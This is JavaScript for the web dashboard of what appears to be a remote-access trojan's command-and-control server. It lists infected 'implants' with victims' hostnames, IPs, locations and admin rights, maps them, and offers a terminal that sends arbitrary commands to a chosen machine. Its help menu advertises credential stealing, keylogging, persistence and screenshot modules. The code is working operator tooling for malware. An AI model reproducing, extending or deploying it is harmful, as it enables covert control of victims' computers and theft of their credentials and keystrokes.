

// Global variables
let authToken = localStorage.getItem('authToken');
let worldMap = null;
let mapMarkers = new Map();
let mapInitialized = false;

// Terminal Variables
let currentTerminalTarget = null;
let terminalHistory = [];
let historyIndex = -1;

// DOM elements
const loginScreen = document.getElementById('loginScreen');
const dashboard = document.getElementById('dashboard');
const loginForm = document.getElementById('loginForm');
const loginError = document.getElementById('loginError');

// Global function for settings - moved to top for global access
function showSettings() {
    
    try {
        // Check if Bootstrap is loaded
        if (typeof bootstrap === 'undefined') {
            console.error('Bootstrap is not loaded');
            alert('Bootstrap library is not loaded. Please check your internet connection.');
            return;
        }
        
        // Show settings modal
        const settingsModal = document.getElementById('settingsModal');
        if (!settingsModal) {
            console.error('Settings modal not found');
            alert('Settings modal element not found in the page.');
            return;
        }
        
        console.log('Opening settings modal...');
        const modal = new bootstrap.Modal(settingsModal);
        modal.show();
        
        console.log('Settings modal opened successfully');
        
        // Initialize settings navigation after modal is shown
        setTimeout(() => {
            loadUserInfoForSettings();
            initializeSettingsNavigation();
            initializePasswordForm();
        }, 100);
        
    } catch (error) {
        console.error('Error in showSettings:', error);
    }
}
 
// Initialize app - Consolidated DOMContentLoaded
document.addEventListener('DOMContentLoaded', function() {
    
    // Initialize authentication
    if (authToken) {
        showDashboard();
    } else {
        showLoginScreen();
    }
    
    // Initialize terminal input handler
    const terminalInput = document.getElementById('terminalInput');
    if (terminalInput) {
        terminalInput.addEventListener('keydown', function(e) {
            if (e.key === 'Enter') {
                executeTerminalCommand();
                // Ensure input stays visible after command execution
                setTimeout(() => {
                    terminalInput.focus();
                    terminalInput.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
                }, 100);
            } else if (e.key === 'ArrowUp') {
                e.preventDefault();
                if (historyIndex < terminalHistory.length - 1) {
                    historyIndex++;
                    terminalInput.value = terminalHistory[historyIndex];
                }
            } else if (e.key === 'ArrowDown') {
                e.preventDefault();
                if (historyIndex > 0) {
                    historyIndex--;
                    terminalInput.value = terminalHistory[historyIndex];
                } else if (historyIndex === 0) {
                    historyIndex = -1;
                    terminalInput.value = '';
                }
            }
        });
    } else {
        // Terminal input not found
    }
    
    // Initialize target selector
    const targetSelect = document.getElementById('targetSelect');
    if (targetSelect) {
        targetSelect.addEventListener('change', function(e) {
            const selectedValue = e.target.value;
            if (selectedValue) {
                const [token, hostname, username] = selectedValue.split('|');
                selectTarget(token, hostname, username);
            } else {
                disconnectTarget();
            }
        });
    } else {
        // Target select not found
    }
});

// Authentication functions
function showLoginScreen() {
    loginScreen.style.display = 'flex';
    dashboard.style.display = 'none';
}

function showDashboard() {
    loginScreen.style.display = 'none';
    dashboard.style.display = 'block';
    
    loadUserInfo();
    loadImplants();
    
    // Auto-refresh every 2 minutes
    setInterval(loadImplants, 120000);
}

function logout() {
    localStorage.removeItem('authToken');
    authToken = null;
    showLoginScreen();
}

// Login form handler
loginForm.addEventListener('submit', async function(e) {
    e.preventDefault();
    
    const username = document.getElementById('username').value;
    const password = document.getElementById('password').value;
    
    try {
        const formData = new FormData();
        formData.append('username', username);
        formData.append('password', password);
        
        const response = await fetch('/auth/login', {
            method: 'POST',
            body: formData
        });
        
        if (response.ok) {
            const data = await response.json();
            authToken = data.access_token;
            localStorage.setItem('authToken', authToken);
            hideError();
            showDashboard();
        } else {
            const error = await response.json();
            showError(error.detail || 'Login failed');
        }
    } catch (error) {
        showError('Connection error. Please try again.');
    }
});

function showError(message) {
    loginError.textContent = message;
    loginError.style.display = 'block';
}

function hideError() {
    loginError.style.display = 'none';
}

// API functions
async function apiRequest(url, options = {}) {
    const defaultOptions = {
        headers: {
            'Authorization': `Bearer ${authToken}`,
            'Content-Type': 'application/json',
            ...options.headers
        }
    };
    
    const response = await fetch(url, { ...defaultOptions, ...options });
    
    if (response.status === 401) {
        logout();
        throw new Error('Unauthorized');
    }
    
    return response;
}

async function loadUserInfo() {
    try {
        const response = await apiRequest('/auth/me');
        if (response.ok) {
            const user = await response.json();
            document.getElementById('currentUser').textContent = user.username;
        }
    } catch (error) {
        console.error('Failed to load user info:', error);
    }
}

async function loadImplants() {
    try {
        const response = await apiRequest('/implants/');
        if (response.ok) {
            const implants = await response.json();
            updateStatistics(implants);
            renderImplantsTable(implants);
        }
    } catch (error) {
        console.error('Failed to load implants:', error);
    }
}

// Global function for sidebar refresh button
async function refreshImplants() {
    console.log('Refreshing implants...');
    await loadImplants();
}

// Settings functions
async function loadUserInfoForSettings() {
    try {
        const response = await apiRequest('/auth/me');
        if (response.ok) {
            const user = await response.json();
            document.getElementById('settingsUsername').value = user.username;
            document.getElementById('settingsUserId').value = user.id;
        }
    } catch (error) {
        console.error('Failed to load user info for settings:', error);
    }
}

function initializeSettingsNavigation() {
    // Remove existing event listeners to avoid duplicates
    const navItems = ['settingsNavAccount', 'settingsNavSecurity', 'settingsNavSystem'];
    const sections = ['settingsAccount', 'settingsSecurity', 'settingsSystem'];
    
    navItems.forEach((navId, index) => {
        const navElement = document.getElementById(navId);
        if (navElement) {
            // Remove existing listeners by cloning the element
            const newNavElement = navElement.cloneNode(true);
            navElement.parentNode.replaceChild(newNavElement, navElement);
            
            // Add new listener
            newNavElement.addEventListener('click', function(e) {
                e.preventDefault();
                showSettingsSection(sections[index]);
                setActiveNav(this);
            });
        }
    });
}

function showSettingsSection(sectionId) {
    // Hide all sections
    document.querySelectorAll('.settings-section').forEach(section => {
        section.style.display = 'none';
    });
    
    // Show selected section
    document.getElementById(sectionId).style.display = 'block';
}

function setActiveNav(activeElement) {
    // Remove active class from all nav items
    document.querySelectorAll('.list-group-item').forEach(item => {
        item.classList.remove('active');
    });
    
    // Add active class to selected item
    activeElement.classList.add('active');
}

function initializePasswordForm() {
    const form = document.getElementById('changePasswordForm');
    const newPassword = document.getElementById('newPassword');
    const confirmPassword = document.getElementById('confirmPassword');
    
    if (!form || !newPassword || !confirmPassword) {
        console.error('Password form elements not found');
        return;
    }
    
    // Remove existing listeners by cloning elements
    const newForm = form.cloneNode(true);
    const newPasswordClone = newForm.querySelector('#newPassword');
    const newConfirmPassword = newForm.querySelector('#confirmPassword');
    form.parentNode.replaceChild(newForm, form);
    
    // Password strength indicator
    newPasswordClone.addEventListener('input', function() {
        updatePasswordStrength(this.value);
    });
    
    // Form submission
    newForm.addEventListener('submit', async function(e) {
        e.preventDefault();
        
        const newPass = newPasswordClone.value;
        const confirmPass = newConfirmPassword.value;
        
        // Validate passwords match
        if (newPass !== confirmPass) {
            showPasswordResult('Passwords do not match', 'error');
            return;
        }
        
        // Validate password length
        if (newPass.length < 8) {
            showPasswordResult('Password must be at least 8 characters long', 'error');
            return;
        }
        
        // Change password
        await changePassword(newPass);
    });
}

function updatePasswordStrength(password) {
    const strengthContainer = document.getElementById('passwordStrength');
    const strengthBar = document.getElementById('strengthBar');
    const strengthText = document.getElementById('strengthText');
    
    if (!password) {
        strengthContainer.style.display = 'none';
        return;
    }
    
    strengthContainer.style.display = 'block';
    
    let strength = 0;
    let feedback = [];
    
    // Length check
    if (password.length >= 8) strength += 25;
    else feedback.push('At least 8 characters');
    
    // Lowercase check
    if (/[a-z]/.test(password)) strength += 25;
    else feedback.push('Lowercase letter');
    
    // Uppercase check
    if (/[A-Z]/.test(password)) strength += 25;
    else feedback.push('Uppercase letter');
    
    // Number check
    if (/[0-9]/.test(password)) strength += 25;
    else feedback.push('Number');
    
    // Update progress bar
    strengthBar.style.width = strength + '%';
    
    if (strength < 50) {
        strengthBar.className = 'progress-bar bg-danger';
        strengthText.textContent = 'Weak - Need: ' + feedback.join(', ');
    } else if (strength < 75) {
        strengthBar.className = 'progress-bar bg-warning';
        strengthText.textContent = 'Fair - Could add: ' + feedback.join(', ');
    } else if (strength < 100) {
        strengthBar.className = 'progress-bar bg-info';
        strengthText.textContent = 'Good - Could add: ' + feedback.join(', ');
    } else {
        strengthBar.className = 'progress-bar bg-success';
        strengthText.textContent = 'Strong password';
    }
}

async function changePassword(newPassword) {
    const resultDiv = document.getElementById('passwordChangeResult');
    
    try {
        // Show loading
        showPasswordResult('Changing password...', 'info');
        
        // Use query parameter as your route expects
        const response = await apiRequest(`/auth/change-password?new_password=${encodeURIComponent(newPassword)}`, {
            method: 'POST'
        });
        
        if (response.ok) {
            const result = await response.json();
            showPasswordResult('Password changed successfully!', 'success');
            
            // Clear form
            document.getElementById('changePasswordForm').reset();
            document.getElementById('passwordStrength').style.display = 'none';
            
            // Auto-hide success message after 3 seconds
            setTimeout(() => {
                resultDiv.style.display = 'none';
            }, 3000);
        } else {
            const error = await response.json();
            showPasswordResult('Failed to change password: ' + (error.detail || 'Unknown error'), 'error');
        }
    } catch (error) {
        showPasswordResult('Error changing password: ' + error.message, 'error');
    }
}

function showPasswordResult(message, type) {
    const resultDiv = document.getElementById('passwordChangeResult');
    
    let className = '';
    let icon = '';
    
    switch (type) {
        case 'success':
            className = 'alert alert-success';
            icon = 'fas fa-check-circle';
            break;
        case 'error':
            className = 'alert alert-danger';
            icon = 'fas fa-exclamation-circle';
            break;
        case 'info':
            className = 'alert alert-info';
            icon = 'fas fa-info-circle';
            break;
        default:
            className = 'alert alert-secondary';
            icon = 'fas fa-info-circle';
    }
    
    resultDiv.innerHTML = `
        <div class="${className}" role="alert">
            <i class="${icon} me-2"></i>${message}
        </div>
    `;
    resultDiv.style.display = 'block';
}

function updateStatistics(implants) {
    const total = implants.length;
    const online = implants.filter(i => isOnline(i.last_seen)).length;
    const offline = total - online;
    const admin = implants.filter(i => i.is_local_admin).length;
    
    document.getElementById('totalImplants').textContent = total;
    document.getElementById('onlineImplants').textContent = online;
    document.getElementById('offlineImplants').textContent = offline;
    document.getElementById('adminImplants').textContent = admin;
    
    // Store implants data globally for dashboard
    window.lastImplantsData = implants;
    
    // Update dashboard if function exists
    if (typeof updateDashboardData === 'function') {
        updateDashboardData(implants);
    }
}

function renderImplantsTable(implants) {
    const tbody = document.getElementById('implantsTableBody');
    tbody.innerHTML = '';
    
    implants.forEach((implant, index) => {    
        const row = document.createElement('tr');
        const isOnlineStatus = isOnline(implant.last_seen);
        
        row.innerHTML = `
            <td>
                <i class="fas fa-circle ${isOnlineStatus ? 'status-online' : 'status-offline'}"></i>
                <span class="badge ${isOnlineStatus ? 'bg-success' : 'bg-danger'} ms-1">
                    ${isOnlineStatus ? 'Online' : 'Offline'}
                </span>
            </td>
            <td>${implant.hostname}</td>
            <td>${implant.username}</td>
            <td>${implant.ip_address}</td>
            <td>${implant.operating_system}</td>
            <td>${implant.geo_location}</td>
            <td>
                <span class="badge ${implant.is_local_admin ? 'bg-warning' : 'bg-secondary'}">
                    ${implant.is_local_admin ? 'Admin' : 'User'}
                </span>
            </td>
            <td>${formatDateTime(implant.last_seen)}</td>
            <td>
                <button class="btn btn-danger btn-sm" 
                        onclick="deleteImplant('${implant.token}', '${implant.hostname}')"
                        title="Delete Implant">
                    <i class="fas fa-times"></i>
                </button>
            </td>
        `;
        
        tbody.appendChild(row);
    });
    
    // Update terminal target selector
    populateTargetSelect(implants);
}


// World map functions
function updateWorldMap(implants) {
    if (!worldMap || !mapInitialized) {
        return;
    }

    // Clear existing markers
    mapMarkers.forEach(marker => {
        marker.setMap(null);
    });
    mapMarkers.clear();

    // Add markers for each implant
    implants.forEach(implant => {
        const coordinates = getLocationCoordinates(implant.geo_location);
        if (coordinates && coordinates.lat && coordinates.lng) {
            createGoogleMapsMarker(implant, coordinates);
            console.log('Marker created for:', implant.hostname);
        } else {
            console.log('No coordinates found for location:', implant.geo_location);
        }
    });
}

function createGoogleMapsMarker(implant, coordinates) {
    const isOnlineStatus = isOnline(implant.last_seen);
    
    const marker = new google.maps.Marker({
        position: { lat: coordinates.lat, lng: coordinates.lng },
        map: worldMap,
        title: `${implant.hostname} (${implant.geo_location})`,
        icon: {
            path: google.maps.SymbolPath.CIRCLE,
            scale: 8,
            fillColor: isOnlineStatus ? '#dc3545' : '#6c757d',
            fillOpacity: 0.9,
            strokeColor: '#ffffff',
            strokeWeight: 2
        }
    });

    // Create info window content
    const infoContent = `
        <div style="font-family: Arial, sans-serif; min-width: 200px;">
            <h6 style="margin: 0 0 10px 0; color: #333;"><strong>${implant.hostname}</strong></h6>
            <p style="margin: 5px 0; font-size: 13px;"><strong>User:</strong> ${implant.username}</p>
            <p style="margin: 5px 0; font-size: 13px;"><strong>OS:</strong> ${implant.operating_system}</p>
            <p style="margin: 5px 0; font-size: 13px;"><strong>Location:</strong> ${implant.geo_location}</p>
            <p style="margin: 5px 0; font-size: 13px;"><strong>Status:</strong> 
                <span style="color: ${isOnlineStatus ? '#28a745' : '#dc3545'}">${isOnlineStatus ? 'Online' : 'Offline'}</span>
            </p>
            <p style="margin: 5px 0; font-size: 13px;"><strong>Admin:</strong> ${implant.is_local_admin ? 'Yes' : 'No'}</p>
            <div style="margin-top: 10px;">
                <button onclick="selectTarget('${implant.token}', '${implant.hostname}', '${implant.username}')" 
                        style="background: #007bff; color: white; border: none; padding: 5px 10px; border-radius: 3px; margin-right: 5px; cursor: pointer;"
                        ${!isOnlineStatus ? 'disabled' : ''}>Select</button>
                <button onclick="viewLastResult('${implant.token}')" 
                        style="background: #28a745; color: white; border: none; padding: 5px 10px; border-radius: 3px; cursor: pointer;">Results</button>
            </div>
        </div>
    `;

    const infoWindow = new google.maps.InfoWindow({
        content: infoContent
    });

    marker.addListener('click', () => {
        // Close any open info windows
        mapMarkers.forEach(otherMarker => {
            if (otherMarker.infoWindow) {
                otherMarker.infoWindow.close();
            }
        });
        
        infoWindow.open(worldMap, marker);
    });

    // Store reference to info window
    marker.infoWindow = infoWindow;
    
    // Store marker
    mapMarkers.set(implant.token, marker);
    
    return marker;
}




// World map functions (old code to remove)
function updateWorldMap_old(implants) {
    const worldMap = document.getElementById('worldMap');
    
    // Clear existing dots
    const existingDots = worldMap.querySelectorAll('.implant-dot');
    existingDots.forEach(dot => dot.remove());
    
    // Add dots for each implant
    implants.forEach(implant => {
        if (isOnline(implant.last_seen)) {
            const dot = createImplantDot(implant);
            worldMap.appendChild(dot);
        }
    });
}

function createImplantDot(implant) {
    const dot = document.createElement('div');
    dot.className = 'implant-dot';
    
    // Simple positioning based on country/location
    const position = getLocationPosition(implant.geo_location);
    dot.style.left = position.x + '%';
    dot.style.top = position.y + '%';
    
    // Add tooltip
    dot.title = `${implant.hostname} (${implant.geo_location})`;
    
    // Add click event
    dot.onclick = () => {
        selectTarget(implant.token, implant.hostname, implant.username);
    };
    
    return dot;
}

function isOnline(lastSeen) {
    const now = new Date();
    const lastSeenDate = new Date(lastSeen);
    const diffMinutes = (now - lastSeenDate) / (1000 * 60);
    return diffMinutes < 5; // Online if seen within 5 minutes
}

function formatDateTime(dateString, includeSeconds = false) {
    const date = new Date(dateString);
    const options = {
        year: 'numeric',
        month: '2-digit',
        day: '2-digit',
        hour: '2-digit',
        minute: '2-digit',
        ...(includeSeconds && { second: '2-digit' })
    };
    return date.toLocaleString('pt-BR', options);
}

function refreshImplants() {
    const refreshIcon = document.getElementById('refreshIcon');
    refreshIcon.classList.add('show');
    
    loadImplants().finally(() => {
        setTimeout(() => {
            refreshIcon.classList.remove('show');
        }, 500);
    });
}



async function viewLastResult(token) {
    try {
        const response = await apiRequest(`/implants/result/${token}`);
        if (response.ok) {
            const result = await response.json();
            showResultModal(result);
        } else {
        }
    } catch (error) {
    }
}

function showResultModal(result) {
    document.getElementById('resultHost').textContent = `${result.username}@${result.hostname}`;
    document.getElementById('resultCommand').textContent = result.last_command_executed || 'No command executed';
    document.getElementById('resultTime').textContent = result.execution_time ? 
        formatDateTime(result.execution_time, true) : 'Never';
    document.getElementById('resultOutput').textContent = result.command_output || 'No output available';
    
    const modal = new bootstrap.Modal(document.getElementById('resultModal'));
    modal.show();
}

async function deleteImplant(token, hostname) {
    if (!confirm(`Are you sure you want to delete implant from ${hostname}?`)) {
        return;
    }
    
    try {
        const response = await apiRequest(`/implants/${token}`, {
            method: 'DELETE'
        });
        
        if (response.ok) {
            showToast('Implant deleted successfully!', 'success');
            loadImplants();
        } else {
            const error = await response.json();
            alert('Failed to delete implant: ' + (error.detail || 'Unknown error'));
        }
    } catch (error) {
        alert('Error deleting implant: ' + error.message);
    }
}

// Utility functions
function showToast(message, type = 'info') {
    // Create toast element
    const toast = document.createElement('div');
    toast.className = `alert alert-${type === 'success' ? 'success' : 'info'} position-fixed`;
    toast.style.cssText = `
        top: 20px;
        right: 20px;
        z-index: 9999;
        min-width: 300px;
    `;
    toast.innerHTML = `
        <i class="fas fa-${type === 'success' ? 'check-circle' : 'info-circle'}"></i>
        ${message}
    `;
    
    document.body.appendChild(toast);
    
    // Auto remove after 3 seconds
    setTimeout(() => {
        toast.remove();
    }, 3000);
}

// Terminal Functions
function populateTargetSelect(implants) {
    const targetSelect = document.getElementById('targetSelect');
    if (!targetSelect) {
        console.error('Target select element not found!');
        return;
    }
    
    // Clear existing options except the first one
    targetSelect.innerHTML = '<option value="">Select Target...</option>';
    
    // Add ALL implants to the select (for testing)
    implants.forEach(implant => {
        const isOnlineStatus = isOnline(implant.last_seen);
        const option = document.createElement('option');
        option.value = `${implant.token}|${implant.hostname}|${implant.username}`;
        option.textContent = `${implant.username}@${implant.hostname} (${implant.ip_address}) ${isOnlineStatus ? '[ONLINE]' : '[OFFLINE]'}`;
        
        // Disable offline implants but still show them
        if (!isOnlineStatus) {
            option.disabled = true;
            option.style.color = '#666';
        }
        
        targetSelect.appendChild(option);
    });
    
    const onlineCount = implants.filter(implant => isOnline(implant.last_seen)).length;
}

function selectTarget(token, hostname, username) {
    
    currentTerminalTarget = {
        token: token,
        hostname: hostname,
        username: username
    };
    
    // Update terminal UI
    const statusElement = document.getElementById('terminalStatus');
    const targetElement = document.getElementById('terminalTarget');
    const promptElement = document.getElementById('terminalPrompt');
    const inputElement = document.getElementById('terminalInput');
    
    if (statusElement) {
        statusElement.textContent = 'CONNECTED';
        statusElement.className = 'status-connected';
    }
    
    if (targetElement) {
        targetElement.textContent = `${username}@${hostname}`;
    }
    
    if (promptElement) {
        promptElement.textContent = `${hostname}>${username}$`;
    }
    
    if (inputElement) {
        inputElement.disabled = false;
        inputElement.focus();
    }
    
    // Add connection message to terminal
    addToTerminal(`Connected to ${username}@${hostname}`, 'info');
    addToTerminal('Type \'help\' for available commands', 'info');
}

function disconnectTarget() {
    if (currentTerminalTarget) {
        addToTerminal(`Disconnected from ${currentTerminalTarget.username}@${currentTerminalTarget.hostname}`, 'warning');
    }
    
    currentTerminalTarget = null;
    
    // Update terminal UI
    document.getElementById('terminalStatus').textContent = 'DISCONNECTED';
    document.getElementById('terminalStatus').className = 'status-disconnected';
    document.getElementById('terminalTarget').textContent = '';
    document.getElementById('terminalPrompt').textContent = 'beacon>';
    document.getElementById('terminalInput').disabled = true;
    document.getElementById('terminalInput').value = '';
    
    // Reset target selector
    document.getElementById('targetSelect').value = '';
}

function clearTerminal() {
    const terminalOutput = document.getElementById('terminalOutput');
    terminalOutput.innerHTML = `
        <div class="terminal-welcome">
            TimeKeeper <br>
            Type 'help' for available commands<br>
            Select a target to begin...<br><br>
        </div>
    `;
}

function testConnection() {
    addToTerminal('Testing terminal functionality...', 'info');
    
    // Try to select first available target (online or offline for testing)
    const targetSelect = document.getElementById('targetSelect');
    if (targetSelect && targetSelect.options.length > 1) {
        // Look for first enabled option
        let selectedOption = null;
        for (let i = 1; i < targetSelect.options.length; i++) {
            if (!targetSelect.options[i].disabled) {
                selectedOption = targetSelect.options[i];
                break;
            }
        }
        
        if (selectedOption) {
            targetSelect.value = selectedOption.value;
            const [token, hostname, username] = selectedOption.value.split('|');
            selectTarget(token, hostname, username);
        } else {
            addToTerminal('No online targets available', 'warning');
        }
    } else {
        addToTerminal('No targets available', 'error');
    }
}

function addToTerminal(text, type = 'output') {
    console.log('Adding to terminal:', text, 'Type:', type);
    const terminalOutput = document.getElementById('terminalOutput');
    if (!terminalOutput) {
        console.error('Terminal output element not found!');
        return;
    }
    
    const outputDiv = document.createElement('div');
    outputDiv.className = `terminal-${type}`;
    
    if (type === 'command') {
        const promptText = document.getElementById('terminalPrompt')?.textContent || 'beacon>';
        outputDiv.innerHTML = `<span class="terminal-command-line">${promptText} ${text}</span>`;
    } else {
        outputDiv.textContent = text;
    }
    
    terminalOutput.appendChild(outputDiv);
    
    // Simple scroll to bottom
    setTimeout(() => {
        terminalOutput.scrollTop = terminalOutput.scrollHeight;
    }, 10);
    
    console.log('Successfully added to terminal');
}

function addTerminalSpacer() {
    const terminalOutput = document.getElementById('terminalOutput');
    if (!terminalOutput) return;
    
    // Remove any existing spacers first
    const existingSpacers = terminalOutput.querySelectorAll('.terminal-spacer');
    existingSpacers.forEach(spacer => spacer.remove());
    
    // Add single spacer
    const spacer = document.createElement('div');
    spacer.style.height = '2rem';
    spacer.style.width = '100%';
    spacer.classList.add('terminal-spacer');
    terminalOutput.appendChild(spacer);
    
    // Scroll to bottom
    setTimeout(() => {
        terminalOutput.scrollTop = terminalOutput.scrollHeight;
    }, 10);
}

async function executeTerminalCommand() {
    console.log('executeTerminalCommand called');
    const terminalInput = document.getElementById('terminalInput');
    if (!terminalInput) {
        console.error('Terminal input not found!');
        return;
    }
    
    const command = terminalInput.value.trim();
    console.log('Command to execute:', command);
    
    if (!command) {
        console.log('Empty command, returning');
        return;
    }
    
    // Add command to terminal output
    addToTerminal(command, 'command');
    terminalHistory.unshift(command);
    historyIndex = -1;
    
    // Clear input
    terminalInput.value = '';
    
    // Handle local commands
    if (command.toLowerCase() === 'help') {
        addToTerminal('Available commands:', 'info');
        addToTerminal('  help          - Show this help message', 'info');
        addToTerminal('  clear         - Clear terminal screen', 'info');
        addToTerminal('  disconnect    - Disconnect from current target', 'info');
        addToTerminal('  whoami        - Show current user', 'info');
        addToTerminal('  systeminfo    - Show system information', 'info');
        addToTerminal('  ipconfig      - Show network configuration', 'info');
        addToTerminal('  dir           - List directory contents', 'info');
        addToTerminal('  tasklist      - Show running processes', 'info');
        addToTerminal('  stealer       - Steal creds from server', 'info');
        addToTerminal('  wifi          - Show Wi-Fi information', 'info');
        addToTerminal('  desktop       - Take a screenshot', 'info');
        addToTerminal('  persistence   - Start persistence module', 'info');
        addToTerminal('  keylogger     - Start keylogger module', 'info');
        addToTerminal('  [any command] - Execute on target system', 'info');
        
        // Add single spacer after all help content
        addTerminalSpacer();
        return;
    }
    
    if (command.toLowerCase() === 'clear') {
        clearTerminal();
        return;
    }
    
    if (command.toLowerCase() === 'exit') {
        disconnectTarget();
        return;
    }
    
    // Check if target is connected
    if (!currentTerminalTarget) {
        addToTerminal('Error: No target connected. Select a target first.', 'error');
        return;
    }
    
    console.log('Executing remote command on target:', currentTerminalTarget);
    
    // Execute remote command
    try {
        
        const response = await apiRequest(`/implants/command/${currentTerminalTarget.token}?command=${encodeURIComponent(command)}`, {
            method: 'POST'
        });
        
        console.log('Command response status:', response.status);
        
        if (response.ok) {
            // Wait a bit then get result
            setTimeout(async () => {
                try {
                    console.log('Getting command result...');
                    const resultResponse = await apiRequest(`/implants/result/${currentTerminalTarget.token}`);
                    if (resultResponse.ok) {
                        const result = await resultResponse.json();
                        console.log('Command result:', result);
                        if (result.command_output) {
                            addToTerminal(result.command_output, 'output');
                        } else {
                            addToTerminal('Command executed successfully (no output)', 'info');
                        }
                        addTerminalSpacer();
                    } else {
                        addToTerminal('Failed to retrieve command output', 'error');
                        addTerminalSpacer();
                    }
                } catch (error) {
                    console.error('Error retrieving output:', error);
                    addToTerminal(`Error retrieving output: ${error.message}`, 'error');
                    addTerminalSpacer();
                }
            }, 2000);
        } else {
            const error = await response.json();
            console.error('Command execution failed:', error);
            addToTerminal(`Failed to execute command: ${error.detail || 'Unknown error'}`, 'error');
            addTerminalSpacer();
        }
    } catch (error) {
        console.error('Error executing command:', error);
        addToTerminal(`Error: ${error.message}`, 'error');
        addTerminalSpacer();
    }
}
